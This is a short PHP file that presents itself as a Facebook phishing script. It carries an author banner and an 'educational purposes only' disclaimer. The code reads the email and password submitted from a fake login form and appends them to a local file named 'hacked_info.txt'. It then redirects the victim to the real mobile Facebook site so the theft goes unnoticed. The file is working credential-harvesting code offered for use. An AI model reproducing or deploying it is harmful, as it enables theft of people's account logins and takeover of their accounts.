<?php
/*
-----------------------------------------------------------------------------------
| This Facebook phishing script was created by Johnny (not real name)              |
-----------------------------------------------------------------------------------
| Contact : markzukerber5@gmail.com                                                |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
|                          DISCLAIMER !                                            |  
|                                                                                  |
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
| I am not responsible if this phishing script gets you in trouble of any kind.    |
-----------------------------------------------------------------------------------

****************IT IS FOR EDUCATIONAL PURPOSES ONLY*******************
*/



header("Location: https://m.facebook.com");
if( isset($_POST['email'] ) && isset( $_POST['pass'] ) )
{
    $txt= $_POST['email'].' | '.$_POST['pass'] . PHP_EOL; 
    file_put_contents('hacked_info.txt', $txt, FILE_APPEND);
}
?>